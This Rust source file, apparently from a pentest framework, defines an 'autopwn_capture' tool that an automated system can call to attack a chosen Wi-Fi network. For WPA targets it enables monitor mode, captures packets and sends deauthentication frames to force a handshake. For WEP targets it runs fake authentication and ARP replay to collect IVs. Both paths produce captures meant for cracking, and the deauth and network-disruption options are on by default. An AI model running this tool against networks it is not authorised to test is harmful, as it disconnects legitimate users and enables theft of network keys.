//! WiFi packet capture tool for WPA handshake and WEP IVs

use super::types::*;
use async_trait::async_trait;
use pentest_core::error::{Error, Result};
use pentest_core::settings::load_settings;
use pentest_core::tools::*;
use pentest_platform::{get_platform, WifiAttackOps};
use serde_json::{json, Value};
use std::time::{Duration, Instant};

/// Capture WiFi handshake or IVs for cracking
pub struct AutoPwnCaptureTool;

#[async_trait]
impl PentestTool for AutoPwnCaptureTool {
    fn name(&self) -> &str {
        "autopwn_capture"
    }

    fn description(&self) -> &str {
        "Capture WiFi handshake (WPA) or IVs (WEP) from a target network. Note: WPA/WPA2/WPA3 requires a client to be connected or connecting for handshake capture. WEP does not require clients."
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema::new(self.name(), self.description())
            .param(ToolParam::required(
                "bssid",
                ParamType::String,
                "Target BSSID (MAC address)",
            ))
            .param(ToolParam::required(
                "channel",
                ParamType::Integer,
                "Target channel (1-14)",
            ))
            .param(ToolParam::required(
                "security",
                ParamType::String,
                "Security type (WEP, WPA, WPA2)",
            ))
            .param(ToolParam::optional(
                "ssid",
                ParamType::String,
                "Target SSID (for display/logging)",
                json!(""),
            ))
            .param(ToolParam::optional(
                "interface",
                ParamType::String,
                "WiFi interface (will use selected adapter if not specified)",
                json!(null),
            ))
            .param(ToolParam::optional(
                "timeout",
                ParamType::Integer,
                "Timeout in seconds for capture",
                json!(120),
            ))
            .param(ToolParam::optional(
                "use_deauth",
                ParamType::Boolean,
                "Use deauth attack to force handshake (WPA only)",
                json!(true),
            ))
            .param(ToolParam::optional(
                "target_ivs",
                ParamType::Integer,
                "Target number of IVs to capture (WEP only)",
                json!(40000),
            ))
            .param(ToolParam::optional(
                "allow_network_disruption",
                ParamType::Boolean,
                "Allow killing NetworkManager if required for monitor mode (will disconnect internet temporarily). Default: true for attack tools",
                json!(true),
            ))
    }

    fn supported_platforms(&self) -> Vec<Platform> {
        vec![Platform::Desktop] // Linux only for now
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> Result<ToolResult> {
        execute_timed(|| async {
            // Parse parameters
            let bssid = params["bssid"]
                .as_str()
                .ok_or_else(|| Error::InvalidParams("bssid is required".into()))?;

            // Parse channel - accept both float and int
            let channel = params["channel"]
                .as_f64()
                .or_else(|| params["channel"].as_u64().map(|v| v as f64))
                .ok_or_else(|| Error::InvalidParams("channel parameter is required (must be a number 1-14)".into()))?
                as u8;

            let security = params["security"]
                .as_str()
                .ok_or_else(|| Error::InvalidParams("security is required".into()))?;

            let ssid = params["ssid"].as_str().unwrap_or("Unknown");
            let timeout_secs = params["timeout"].as_u64().unwrap_or(120);
            let use_deauth = params["use_deauth"].as_bool().unwrap_or(true);
            let target_ivs = params["target_ivs"].as_u64().unwrap_or(40000) as u32;
            let allow_network_disruption = params["allow_network_disruption"].as_bool().unwrap_or(true);

            // Get interface from settings or param
            let settings = load_settings();
            let interface = params["interface"]
                .as_str()
                .map(String::from)
                .or(settings.wifi_adapter)
                .ok_or_else(|| {
                    Error::InvalidParams(
                        "No WiFi adapter specified - select one in Settings first".into(),
                    )
                })?;

            let sec_type = SecurityType::parse(security);

            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("📡 AutoPwn Capture Phase");
            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("  Target:     {} ({})", ssid, bssid);
            tracing::info!("  Security:   {}", sec_type.as_str());
            tracing::info!("  Channel:    {}", channel);
            tracing::info!("  Interface:  {}", interface);
            tracing::info!("  Timeout:    {}s", timeout_secs);
            tracing::info!("───────────────────────────────────────────────────");

            let platform = get_platform();

            // Enable monitor mode
            tracing::info!("⚙️  Enabling monitor mode...");
            let mon_interface = platform
                .enable_monitor_mode(&interface, allow_network_disruption)
                .await
                .map_err(|e| {
                    Error::ToolExecution(format!("Failed to enable monitor mode: {}. Make sure aircrack-ng is installed and you have sudo access.", e))
                })?;

            tracing::info!("✓ Monitor mode enabled: {}", mon_interface);

            // Set up cleanup on error or completion
            let cleanup_mon_interface = mon_interface.clone();
            let cleanup = async {
                tracing::info!("🧹 Cleaning up and restoring network...");
                if let Err(e) = platform.disable_monitor_mode(&cleanup_mon_interface).await {
                    tracing::warn!("Failed to disable monitor mode: {}", e);
                }
            };

            // Create output directory
            let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
            let output_dir = format!("/tmp/autopwn-{}", timestamp);
            std::fs::create_dir_all(&output_dir)
                .map_err(|e| Error::ToolExecution(format!("Failed to create output directory: {}", e)))?;

            let output_file = format!("{}/capture", output_dir);

            tracing::info!("📁 Output directory: {}", output_dir);

            // Execute capture based on security type
            let result = match sec_type {
                SecurityType::Wpa | SecurityType::Wpa2 => {
                    capture_wpa(
                        &platform,
                        &mon_interface,
                        bssid,
                        channel,
                        &output_file,
                        timeout_secs,
                        use_deauth,
                    )
                    .await
                }
                SecurityType::Wep => {
                    capture_wep(
                        &platform,
                        &mon_interface,
                        bssid,
                        channel,
                        &output_file,
                        target_ivs,
                    )
                    .await
                }
                _ => {
                    cleanup.await;
                    return Err(Error::InvalidParams(format!(
                        "{} security not supported",
                        sec_type.as_str()
                    )));
                }
            };

            // Cleanup and restore network (always runs)
            tracing::info!("");
            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("📡 Restoring Network Connectivity");
            tracing::info!("═══════════════════════════════════════════════════");
            cleanup.await;
            tracing::info!("✓ Network restoration complete");
            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("");

            match result {
                Ok(capture_result) => Ok(json!(capture_result)),
                Err(e) => Err(e),
            }
        })
        .await
    }
}

/// Capture WPA handshake
async fn capture_wpa(
    platform: &impl WifiAttackOps,
    interface: &str,
    bssid: &str,
    channel: u8,
    output_file: &str,
    timeout_secs: u64,
    use_deauth: bool,
) -> Result<CaptureResult> {
    tracing::info!("");
    tracing::info!("🎯 WPA Handshake Capture");
    tracing::info!("───────────────────────────────────────────────────");

    let start = Instant::now();

    // Test injection
    tracing::info!("⚡ Testing packet injection...");
    let injection = platform.test_injection(interface).await?;
    if injection.supported {
        tracing::info!(
            "✓ Injection working ({:.0}% success)",
            injection.success_rate * 100.0
        );
    } else {
        tracing::warn!("⚠ Injection not supported - deauth may not work");
    }

    // Start capture
    tracing::info!("📡 Starting packet capture...");
    let capture_handle = platform
        .start_capture(interface, bssid, channel, output_file)
        .await?;

    tracing::info!("⏳ Waiting for handshake...");

    let mut handshake_found = false;
    let mut deauth_sent = false;
    let timeout = Duration::from_secs(timeout_secs);

    // Poll for handshake
    while start.elapsed() < timeout && !handshake_found {
        tokio::time::sleep(Duration::from_secs(5)).await;

        let stats = platform.get_capture_stats(&capture_handle).await?;
        tracing::info!(
            "  Packets: {} | Handshake: {}",
            stats.packets,
            if stats.has_handshake {
                "YES ✓"
            } else {
                "waiting..."
            }
        );

        if stats.has_handshake {
            handshake_found = true;
            break;
        }

        // Send deauth halfway through timeout if no handshake yet
        if use_deauth && !deauth_sent && start.elapsed() > timeout / 2 {
            tracing::info!("⚡ Sending deauth to force reconnection...");
            if let Err(e) = platform.deauth_attack(interface, bssid, None, 5).await {
                tracing::warn!("Deauth failed: {}", e);
            } else {
                deauth_sent = true;
            }
        }
    }

    // Stop capture
    platform.stop_capture(capture_handle).await?;

    if handshake_found {
        // Verify handshake
        tracing::info!("🔍 Verifying handshake...");
        let cap_file = format!("{}-01.cap", output_file);
        let verified = platform.verify_handshake(&cap_file, bssid).await?;

        if verified {
            tracing::info!("✓ Valid handshake captured!");
            tracing::info!("📁 Capture file: {}", cap_file);
        } else {
            tracing::warn!("⚠ Handshake may be incomplete");
        }

        Ok(CaptureResult {
            success: true,
            capture_file: cap_file,
            capture_type: CaptureType::WpaHandshake { verified },
            quality: if verified {
                CaptureQuality::Excellent
            } else {
                CaptureQuality::Fair
            },
            duration_sec: start.elapsed().as_secs(),
        })
    } else {
        tracing::warn!("✗ Failed to capture handshake within timeout");
        Err(Error::Timeout(format!(
            "No handshake captured within {} seconds",
            timeout_secs
        )))
    }
}

/// Capture WEP IVs
async fn capture_wep(
    platform: &impl WifiAttackOps,
    interface: &str,
    bssid: &str,
    channel: u8,
    output_file: &str,
    target_ivs: u32,
) -> Result<CaptureResult> {
    tracing::info!("");
    tracing::info!("🎯 WEP IV Capture");
    tracing::info!("───────────────────────────────────────────────────");
    tracing::info!("  Target IVs: {}", target_ivs);

    let start = Instant::now();

    // Test injection
    tracing::info!("⚡ Testing packet injection...");
    let injection = platform.test_injection(interface).await?;
    if !injection.supported {
        return Err(Error::ToolExecution(
            "Packet injection required for WEP attacks but not supported".into(),
        ));
    }
    tracing::info!(
        "✓ Injection working ({:.0}% success)",
        injection.success_rate * 100.0
    );

    // Fake authentication
    tracing::info!("🔐 Performing fake authentication...");
    platform.fake_auth(interface, bssid).await?;
    tracing::info!("✓ Fake authentication successful");

    // Start capture
    tracing::info!("📡 Starting packet capture...");
    let capture_handle = platform
        .start_capture(interface, bssid, channel, output_file)
        .await?;

    // Start ARP replay attack
    tracing::info!("⚡ Starting ARP replay attack...");
    let arp_handle = platform.start_arp_replay(interface, bssid).await?;
    tracing::info!("✓ ARP replay started - generating IVs...");

    // Monitor IV collection
    let mut last_iv_count = 0;
    let mut last_update = Instant::now();

    loop {
        tokio::time::sleep(Duration::from_secs(5)).await;

        let stats = platform.get_capture_stats(&capture_handle).await?;
        let iv_rate = if last_update.elapsed().as_secs() > 0 {
            (stats.ivs - last_iv_count) as f32 / last_update.elapsed().as_secs() as f32
        } else {
            0.0
        };

        tracing::info!(
            "  IVs: {} / {} ({:.0}/sec)",
            stats.ivs,
            target_ivs,
            iv_rate
        );

        last_iv_count = stats.ivs;
        last_update = Instant::now();

        if stats.ivs >= target_ivs {
            tracing::info!("✓ Sufficient IVs collected");
            break;
        }
    }

    // Stop attacks
    platform.stop_arp_replay(arp_handle).await?;
    platform.stop_capture(capture_handle).await?;

    let cap_file = format!("{}-01.cap", output_file);
    tracing::info!("📁 Capture file: {}", cap_file);

    Ok(CaptureResult {
        success: true,
        capture_file: cap_file,
        capture_type: CaptureType::WepIvs { count: last_iv_count },
        quality: CaptureQuality::Excellent,
        duration_sec: start.elapsed().as_secs(),
    })
}
